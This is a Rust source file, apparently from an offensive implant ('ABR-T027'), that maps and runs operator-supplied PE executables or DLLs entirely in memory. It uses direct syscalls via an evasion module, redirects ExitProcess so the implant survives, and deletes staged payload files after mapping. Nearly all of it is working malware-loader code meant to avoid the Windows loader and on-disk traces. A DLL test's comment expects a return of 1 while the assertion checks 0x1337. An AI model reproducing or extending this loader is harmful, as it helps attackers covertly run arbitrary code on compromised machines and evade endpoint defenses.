//! In-memory native PE execution (ABR-T027): map an operator-supplied
//! x64 PE (console .exe or .dll) inside the implant — sections,
//! DIR64 relocations, imports against live user-mode modules — and run
//! it on a dedicated thread, without touching CreateProcess and
//! without the payload ever existing as a loaded module.
//!
//! Host-protection contract: a console EXE's CRT eventually calls
//! `ExitProcess`/`TerminateProcess`/`exit`, which would kill the
//! implant. The import resolver redirects those entries (and only
//! those) to a small stub that tail-jumps to the REAL `ExitThread`
//! with the exit code preserved in RCX — the payload's thread ends,
//! the implant lives. The session thread blocks in
//! NtWaitForSingleObject for the payload's lifetime, so the ekko
//! single-thread invariant is never violated (no sleep window can open
//! while the payload runs).
//!
//! Documented limitations (kept honest): the payload sees the REAL
//! PEB, so GetCommandLine-style introspection observes the implant's
//  command line, not the payload's; TLS callbacks are not invoked;
//! import-by-ordinal aborts (same fail-closed rule as the kernel
//! mapper). Transport cap: 48 KB inline in the task frame; larger PEs
//! travel by `upload` and run from their staged path, which is deleted
//! right after the image is mapped (execution is always from memory).

use crate::evasion::syscalls;

const STATUS_MASK: u32 = 0x8000_0000;
const CURRENT_PROCESS: usize = usize::MAX;
const PAGE_READWRITE: usize = 0x04;
const PAGE_EXECUTE_READ: usize = 0x20;
const MEM_RELEASE: usize = 0x8000;

/// Imports redirected to the ExitThread stub so a console EXE cannot
/// take the implant down with it.
const EXIT_REDIRECTS: &[&str] = &[
    "ExitProcess",
    "TerminateProcess",
    "RtlExitUserProcess",
    "exit",
    "_exit",
    "_Exit",
];

#[repr(C)]
#[derive(Default, Clone, Copy)]
struct ProcessBasicInformation {
    exit_status: isize,
    peb_base: usize,
    affinity: usize,
    base_priority: isize,
    unique_pid: usize,
    inherited_pid: usize,
}

fn read_u16(buf: &[u8], off: usize) -> Result<u16, String> {
    buf.get(off..off + 2)
        .map(|b| u16::from_le_bytes([b[0], b[1]]))
        .ok_or_else(|| "truncated PE".into())
}
fn read_u32(buf: &[u8], off: usize) -> Result<u32, String> {
    buf.get(off..off + 4)
        .map(|b| u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
        .ok_or_else(|| "truncated PE".into())
}
fn read_u32_at(buf: &[u8], va: usize) -> Result<u32, String> {
    read_u32(buf, va)
}

fn read_cstr(buf: &[u8], off: usize) -> Option<String> {
    let end = buf[off..].iter().position(|b| *b == 0)? + off;
    Some(String::from_utf8_lossy(&buf[off..end]).into_owned())
}

/// (image_type: 2=exe 3=dll, entry_rva, image_base, size_of_image,
///  size_of_headers, section headers as (va, raw_ptr, raw_size),
///  reloc_dir, import_dir)
struct ParsedPe {
    is_dll: bool,
    entry_rva: usize,
    preferred_base: u64,
    size_of_image: usize,
    size_of_headers: usize,
    sections: Vec<(usize, usize, usize)>,
    reloc_rva: usize,
    reloc_size: usize,
    import_rva: usize,
    import_size: usize,
}

impl ParsedPe {
    /// RVA -> file offset through the section table. Rust/MSVC PEs use
    /// FileAlignment 0x200 with SectionAlignment 0x1000, so an RVA is
    /// NOT a file offset outside the headers region.
    fn rva2off(&self, rva: usize) -> Option<usize> {
        if rva < self.size_of_headers {
            return Some(rva);
        }
        for (va, raw_ptr, raw_size) in &self.sections {
            if rva >= *va && rva < *va + *raw_size {
                return Some(raw_ptr + (rva - va));
            }
        }
        None
    }
}

fn parse_pe(image: &[u8]) -> Result<ParsedPe, String> {
    if read_u16(image, 0)? != 0x5A4D {
        return Err("missing MZ".into());
    }
    let pe_off = read_u32(image, 0x3C)? as usize;
    if read_u32(image, pe_off)? != 0x0000_4550 {
        return Err("missing PE signature".into());
    }
    let opt = pe_off + 24;
    let magic = read_u16(image, opt)?;
    if magic != 0x20B {
        return Err(format!("not PE32+ (magic {magic:#x})"));
    }
    let entry_rva = read_u32(image, opt + 16)? as usize;
    let preferred_base = u64::from_le_bytes(
        image[opt + 24..opt + 32]
            .try_into()
            .map_err(|_| "truncated image base")?,
    );
    let size_of_image = read_u32(image, opt + 56)? as usize;
    let size_of_headers = read_u32(image, opt + 60)? as usize;
    let characteristics = read_u16(image, pe_off + 22)?;
    let num_sections = read_u16(image, pe_off + 6)? as usize;
    let mut sections = Vec::with_capacity(num_sections);
    let sec_table = opt + read_u16(image, pe_off + 20)? as usize;
    for i in 0..num_sections {
        let so = sec_table + i * 40;
        let va = read_u32(image, so + 12)? as usize;
        let raw_size = read_u32(image, so + 16)? as usize;
        let raw_ptr = read_u32(image, so + 20)? as usize;
        sections.push((va, raw_ptr, raw_size));
    }
    let dirs = opt + 112;
    let import_rva = read_u32_at(image, dirs + 8)? as usize;
    let import_size = read_u32_at(image, dirs + 12)? as usize;
    let reloc_rva = read_u32_at(image, dirs + 40)? as usize;
    let reloc_size = read_u32_at(image, dirs + 44)? as usize;
    Ok(ParsedPe {
        is_dll: characteristics & 0x2000 != 0,
        entry_rva,
        preferred_base,
        size_of_image,
        size_of_headers,
        sections,
        reloc_rva,
        reloc_size,
        import_rva,
        import_size,
    })
}

/// Maps, relocates, resolves imports and runs the PE on a new thread;
/// returns the payload thread's exit code (EXE: the CRT's exit value;
/// DLL: the DllMain BOOL result).
pub fn run(image: &[u8]) -> Result<u32, String> {
    if image.is_empty() {
        return Err("empty payload".into());
    }
    let pe = parse_pe(image)?;
    let alloc = unsafe { syscalls::resolve("NtAllocateVirtualMemory") }
        .ok_or("NtAllocateVirtualMemory unresolved")?;
    let protect = unsafe { syscalls::resolve("NtProtectVirtualMemory") }
        .ok_or("NtProtectVirtualMemory unresolved")?;
    let free = unsafe { syscalls::resolve("NtFreeVirtualMemory") }
        .ok_or("NtFreeVirtualMemory unresolved")?;

    // --- image allocation ---
    let mut base: usize = 0;
    let mut region = pe.size_of_image;
    let status = unsafe {
        syscalls::dispatch6(
            alloc,
            CURRENT_PROCESS,
            &mut base as *mut usize as usize,
            0,
            &mut region as *mut usize as usize,
            0x3000,
            PAGE_READWRITE,
        )
    };
    if (status as u32) & STATUS_MASK != 0 || base == 0 {
        return Err(format!("image allocation failed: {status:#010x}"));
    }
    let cleanup_image = |base: usize| unsafe {
        let mut b = base;
        let mut zero = 0usize;
        syscalls::dispatch6(
            free,
            CURRENT_PROCESS,
            &mut b as *mut usize as usize,
            &mut zero as *mut usize as usize,
            MEM_RELEASE,
            0,
            0,
        );
    };

    // --- headers + sections ---
    if pe.size_of_headers > image.len() {
        cleanup_image(base);
        return Err("headers exceed file".into());
    }
    for (i, byte) in image[..pe.size_of_headers].iter().enumerate() {
        unsafe { std::ptr::write_volatile((base + i) as *mut u8, *byte) };
    }
    for (va, raw_ptr, raw_size) in &pe.sections {
        let src_end = raw_ptr + raw_size;
        if src_end > image.len() || va + raw_size > pe.size_of_image {
            cleanup_image(base);
            return Err("section outside file/image".into());
        }
        for i in 0..*raw_size {
            unsafe { std::ptr::write_volatile((base + va + i) as *mut u8, image[raw_ptr + i]) };
        }
    }

    // --- relocations (DIR64 only; no relocs + moved base = abort) ---
    // A moved image with an empty reloc directory is legal when the
    // payload is RIP-relative throughout (IAT resolved at load time by
    // us, no absolute immediates) — modern tiny PEs are exactly that.
    // Absolute references would simply fault in the entry; that is a
    // payload property, reported by the run failing.
    let delta = (base as u64).wrapping_sub(pe.preferred_base);
    if delta != 0 && pe.reloc_size > 0 {
        let reloc_off = match pe.rva2off(pe.reloc_rva) {
            Some(off) => off,
            None => {
                cleanup_image(base);
                return Err("reloc directory unmapped".into());
            }
        };
        let mut off = reloc_off;
        let end = reloc_off + pe.reloc_size;
        while off + 8 <= end && off + 8 <= image.len() {
            let page_rva = read_u32_at(image, off).unwrap_or(0) as usize;
            let block_size = read_u32_at(image, off + 4).unwrap_or(0) as usize;
            if block_size < 8 || off + block_size > end {
                break;
            }
            let count = (block_size - 8) / 2;
            for i in 0..count {
                let entry = read_u16(image, off + 8 + i * 2).unwrap_or(0);
                let kind = (entry >> 12) & 0xF;
                let fixup = (entry & 0x0FFF) as usize;
                if kind == 0 {
                    continue; // absolute padding
                }
                if kind != 10 {
                    cleanup_image(base);
                    return Err(format!("unsupported reloc type {kind}"));
                }
                let target = base + page_rva + fixup;
                if target + 8 > base + pe.size_of_image {
                    cleanup_image(base);
                    return Err("reloc outside image".into());
                }
                unsafe {
                    let mut value = std::ptr::read_volatile(target as *const u64);
                    value = value.wrapping_add(delta);
                    std::ptr::write_volatile(target as *mut u64, value);
                }
            }
            off += block_size;
        }
    }

    // --- exit-redirect stub (RX page: movabs rax, ExitThread; jmp rax) ---
    let exit_thread = unsafe { syscalls::export_address("kernel32.dll", "ExitThread") }
        .ok_or("ExitThread unresolved")?;
    let mut stub_base: usize = 0;
    let mut stub_region: usize = 0x1000;
    let status = unsafe {
        syscalls::dispatch6(
            alloc,
            CURRENT_PROCESS,
            &mut stub_base as *mut usize as usize,
            0,
            &mut stub_region as *mut usize as usize,
            0x3000,
            PAGE_READWRITE,
        )
    };
    if (status as u32) & STATUS_MASK != 0 || stub_base == 0 {
        cleanup_image(base);
        return Err(format!("stub allocation failed: {status:#010x}"));
    }
    let cleanup_stub = |stub_base: usize| unsafe {
        let mut b = stub_base;
        let mut zero = 0usize;
        syscalls::dispatch6(
            free,
            CURRENT_PROCESS,
            &mut b as *mut usize as usize,
            &mut zero as *mut usize as usize,
            MEM_RELEASE,
            0,
            0,
        );
    };
    let mut stub = vec![0x48u8, 0xB8];
    stub.extend_from_slice(&(exit_thread as u64).to_le_bytes());
    stub.extend_from_slice(&[0xFF, 0xE0]);
    for (i, byte) in stub.iter().enumerate() {
        unsafe { std::ptr::write_volatile((stub_base + i) as *mut u8, *byte) };
    }
    let mut stub_old: u32 = 0;
    unsafe {
        syscalls::dispatch6(
            protect,
            CURRENT_PROCESS,
            &mut stub_base as *mut usize as usize,
            &mut stub_region as *mut usize as usize,
            PAGE_EXECUTE_READ,
            &mut stub_old as *mut u32 as usize,
            0,
        );
    }

    // --- imports against live modules, with exit redirects ---
    let map_import_error = |e: String, base: usize, stub_base: usize| {
        cleanup_image(base);
        cleanup_stub(stub_base);
        e
    };
    if pe.import_size > 0 && pe.import_rva != 0 {
        let import_off = match pe.rva2off(pe.import_rva) {
            Some(off) => off,
            None => {
                return Err(map_import_error(
                    "import directory unmapped".into(),
                    base,
                    stub_base,
                ))
            }
        };
        let mut desc = import_off;
        while desc + 20 <= image.len() {
            let oft = read_u32_at(image, desc).unwrap_or(0) as usize;
            let name_rva = read_u32_at(image, desc + 12).unwrap_or(0) as usize;
            let iat = read_u32_at(image, desc + 16).unwrap_or(0) as usize;
            if oft == 0 && iat == 0 {
                break;
            }
            let name_off = match pe.rva2off(name_rva) {
                Some(off) => off,
                None => {
                    return Err(map_import_error(
                        "import module name unmapped".into(),
                        base,
                        stub_base,
                    ))
                }
            };
            let module = match read_cstr(image, name_off) {
                Some(name) => name,
                None => {
                    return Err(map_import_error(
                        "import module name unreadable".into(),
                        base,
                        stub_base,
                    ))
                }
            };
            let thunk_rva = if oft != 0 { oft } else { iat };
            let mut slot = 0usize;
            loop {
                let entry_va = match pe.rva2off(thunk_rva + slot * 8) {
                    Some(off) => off,
                    None => return Err(map_import_error("thunk unmapped".into(), base, stub_base)),
                };
                if entry_va + 8 > image.len() {
                    return Err(map_import_error(
                        "thunk outside file".into(),
                        base,
                        stub_base,
                    ));
                }
                let value = u64::from_le_bytes(
                    image[entry_va..entry_va + 8]
                        .try_into()
                        .map_err(|_| "thunk read".to_string())?,
                );
                if value == 0 {
                    break;
                }
                if value & (1 << 63) != 0 {
                    return Err(map_import_error(
                        format!("ordinal import in {module} (unsupported)"),
                        base,
                        stub_base,
                    ));
                }
                let name_off = match pe.rva2off(value as usize + 2) {
                    Some(off) => off,
                    None => {
                        return Err(map_import_error(
                            "import name unmapped".into(),
                            base,
                            stub_base,
                        ))
                    }
                };
                let func_name = match read_cstr(image, name_off) {
                    Some(name) => name,
                    None => {
                        return Err(map_import_error(
                            "import name unreadable".into(),
                            base,
                            stub_base,
                        ))
                    }
                };
                let resolved = if EXIT_REDIRECTS.contains(&func_name.as_str()) {
                    stub_base
                } else {
                    match unsafe { syscalls::export_address(&module, &func_name) } {
                        Some(addr) => addr,
                        None => {
                            return Err(map_import_error(
                                format!("{module}!{func_name} unresolved"),
                                base,
                                stub_base,
                            ))
                        }
                    }
                };
                let iat_va = base + iat + slot * 8;
                unsafe { std::ptr::write_volatile(iat_va as *mut u64, resolved as u64) };
                slot += 1;
            }
            desc += 20;
        }
    }

    // --- flip the whole image RX ---
    let mut lo = base;
    let mut whole = pe.size_of_image;
    let mut image_old: u32 = 0;
    let status = unsafe {
        syscalls::dispatch6(
            protect,
            CURRENT_PROCESS,
            &mut lo as *mut usize as usize,
            &mut whole as *mut usize as usize,
            PAGE_EXECUTE_READ,
            &mut image_old as *mut u32 as usize,
            0,
        )
    };
    if (status as u32) & STATUS_MASK != 0 {
        cleanup_image(base);
        cleanup_stub(stub_base);
        return Err(format!("image protect failed: {status:#010x}"));
    }

    // --- PEB for the entry signature (peb, reason, reserved) ---
    let query = unsafe { syscalls::resolve("NtQueryInformationProcess") }
        .ok_or("NtQueryInformationProcess unresolved")?;
    let mut pbi = ProcessBasicInformation::default();
    let mut returned = 0usize;
    let status = unsafe {
        syscalls::dispatch6(
            query,
            CURRENT_PROCESS,
            0,
            &mut pbi as *mut ProcessBasicInformation as usize,
            std::mem::size_of::<ProcessBasicInformation>(),
            &mut returned as *mut usize as usize,
            0,
        )
    };
    if (status as u32) & STATUS_MASK != 0 || pbi.peb_base == 0 {
        cleanup_image(base);
        cleanup_stub(stub_base);
        return Err("PEB query failed".into());
    }

    // --- dedicated thread, waited synchronously on the session thread ---
    // RtlCreateUserThread is a regular ntdll function, not a syscall
    // stub — resolve() (Hell's Gate) would reject it, so take the
    // address through the manual export walk.
    let create_thread = unsafe { syscalls::export_address("ntdll.dll", "RtlCreateUserThread") }
        .ok_or("RtlCreateUserThread unresolved")?;
    let wait = unsafe { syscalls::resolve("NtWaitForSingleObject") }
        .ok_or("NtWaitForSingleObject unresolved")?;
    let close = unsafe { syscalls::resolve("NtClose") }.ok_or("NtClose unresolved")?;
    let entry = base + pe.entry_rva;
    let mut thread: usize = 0;
    let mut client_id = [0usize; 2];
    // RtlCreateUserThread(Process, SecurityDescriptor, CreateSuspended,
    //                     StackZeroBits, StackReserved, StackCommit,
    //                     StartAddress, Parameter, Thread, ClientId)
    type RtlCreateUserThreadFn = unsafe extern "system" fn(
        usize, // process
        usize, // security descriptor
        u32,   // create suspended
        usize, // stack zero bits
        usize, // stack reserved
        usize, // stack commit
        usize, // start address
        usize, // parameter
        *mut usize,
        *mut usize,
    ) -> i32;
    let create_thread: RtlCreateUserThreadFn = unsafe { std::mem::transmute(create_thread) };
    let status = unsafe {
        create_thread(
            CURRENT_PROCESS,
            0,
            0,
            0,
            0,
            0,
            entry,
            pbi.peb_base,
            &mut thread,
            client_id.as_mut_ptr(),
        )
    };
    if (status as u32) & STATUS_MASK != 0 || thread == 0 {
        cleanup_image(base);
        cleanup_stub(stub_base);
        return Err(format!("thread creation failed: {status:#010x}"));
    }
    unsafe { syscalls::dispatch6(wait, thread, 0, 0, 0, 0, 0) };
    // Exit code via kernel32 BEFORE releasing the handle (the payload's
    // ExitProcess became ExitThread, so the code rides the thread).
    let get_exit: unsafe extern "system" fn(usize, *mut u32) -> i32 = unsafe {
        std::mem::transmute(
            syscalls::export_address("kernel32.dll", "GetExitCodeThread")
                .ok_or("GetExitCodeThread unresolved")?,
        )
    };
    let mut exit_code: u32 = 0;
    unsafe { get_exit(thread, &mut exit_code) };
    unsafe { syscalls::dispatch6(close, thread, 0, 0, 0, 0, 0) };

    cleanup_image(base);
    cleanup_stub(stub_base);
    let kind = if pe.is_dll { "dll" } else { "exe" };
    let _ = kind;
    Ok(exit_code)
}

/// `run` with the payload read from a staged path; the file is removed
/// the moment the image is mapped (execution is always from memory).
pub fn run_from_path(path: &str) -> Result<u32, String> {
    let mut image = std::fs::read(path).map_err(|e| format!("{path}: {e}"))?;
    let result = run(&image);
    crate::evasion::secure_clear(&mut image);
    let _ = std::fs::remove_file(path);
    result
}

#[cfg(test)]
mod tests {
    use super::*;

    fn compile_payload(file: &str, cdylib: bool) -> std::path::PathBuf {
        let dir = std::env::temp_dir().join("abraham_runpe_test");
        std::fs::create_dir_all(&dir).unwrap();
        let source = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
            .parent()
            .unwrap()
            .join("tools")
            .join(file);
        let out = dir.join(if cdylib { "proof.dll" } else { "proof.exe" });
        let mut cmd = std::process::Command::new("rustc");
        if cdylib {
            cmd.arg("--crate-type=cdylib");
            cmd.arg("-C").arg("panic=abort");
            cmd.arg("-C").arg("link-args=/ENTRY:DllMain /DYNAMICBASE");
        } else {
            // no_std console entry: no CRT, no TLS — the mapper's
            // core mechanics without loader-dependent TLS state.
            cmd.arg("-C").arg("panic=abort");
            cmd.arg("-C")
                .arg("link-args=/ENTRY:start /SUBSYSTEM:CONSOLE /DYNAMICBASE");
        }
        cmd.arg(source).arg("-o").arg(&out);
        let status = cmd.status().expect("rustc spawn");
        assert!(status.success(), "rustc failed for {file}");
        out
    }

    #[test]
    fn rtl_create_user_thread_resolves() {
        let addr =
            unsafe { crate::evasion::syscalls::export_address("ntdll.dll", "RtlCreateUserThread") };
        assert!(
            addr.is_some(),
            "RtlCreateUserThread unresolved by the manual resolver"
        );
    }

    #[test]
    fn rejects_non_pe_input() {
        let err = run(b"not a pe at all").unwrap_err();
        assert!(
            err.contains("MZ") || err.contains("PE"),
            "unexpected: {err}"
        );
    }

    /// Console EXE with the real CRT: main exits 0x1337; the import
    /// redirect must turn ExitProcess into ExitThread so this test
    /// process survives and observes the exit code on the payload
    /// thread.
    #[test]
    #[ignore = "payload thread with real CRT; run with --test-threads=1"]
    fn exe_proof_exit_redirect() {
        let exe = compile_payload("proof_exe.rs", false);
        let image = std::fs::read(&exe).unwrap();
        let code = run(&image).expect("runpe exe");
        assert_eq!(code, 0x1337);
    }

    /// DLL with the default DllMain: entry returns TRUE (1).
    #[test]
    #[ignore = "payload thread with real CRT; run with --test-threads=1"]
    fn dll_proof() {
        let dll = compile_payload("proof_dll.rs", true);
        let image = std::fs::read(&dll).unwrap();
        let code = run(&image).expect("runpe dll");
        assert_eq!(code, 0x1337);
    }
}
